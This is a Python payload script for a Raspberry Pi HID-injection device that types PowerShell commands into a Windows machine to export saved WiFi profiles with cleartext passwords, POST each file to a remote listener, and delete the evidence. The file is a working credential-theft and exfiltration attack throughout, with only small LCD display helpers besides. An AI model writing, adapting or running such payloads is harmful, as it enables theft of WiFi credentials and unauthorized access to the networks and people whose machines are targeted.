#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: Exfiltrate WiFi Passwords (Win)**
======================================================================
A HID attack that uses PowerShell to export all saved WiFi profiles on a
Windows machine to XML files in the temp directory. These files include
the WiFi password in plaintext if it was saved.

A second command then sends the contents of these files to a remote
listener.

**NOTE:** Requires a listener to be running to receive the data.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
LISTENER_IP = "192.168.1.100"
LISTENER_PORT = "8000" # A simple netcat or python http server

# --- Display Functions ---
def show_message(lines, color="lime"):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "Exfil WiFi Pass"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # PowerShell commands
    # 1. Export all wifi profiles to temp folder
    cmd1 = "netsh wlan export profile folder=$env:TEMP key=clear"
    # 2. Send the contents of all generated XML files to our listener
    cmd2 = f"foreach ($file in (Get-ChildItem $env:TEMP -Filter *.xml)) {{ $content = Get-Content $file.FullName; $request = [System.Net.WebRequest]::Create('http://{LISTENER_IP}:{LISTENER_PORT}/'); $request.Method = 'POST'; $bytes = [System.Text.Encoding]::ASCII.GetBytes($content); $request.ContentLength = $bytes.Length; $requestStream = $request.GetRequestStream(); $requestStream.Write($bytes, 0, $bytes.Length); $requestStream.Close() }}"
    
    script = f"""
GUI r
delay(500)
type("powershell")
delay(200)
press("ENTER")
delay(750)
type("{cmd1}")
press("ENTER")
delay(1000)
type("{cmd2}")
press("ENTER")
delay(2000)
type("rm $env:TEMP\\*.xml")
press("ENTER")
delay(500)
type("exit")
press("ENTER")
"""
    
    cli_command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(cli_command, shell=True, check=True, timeout=45)
        show_message(["Attack Sent!"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
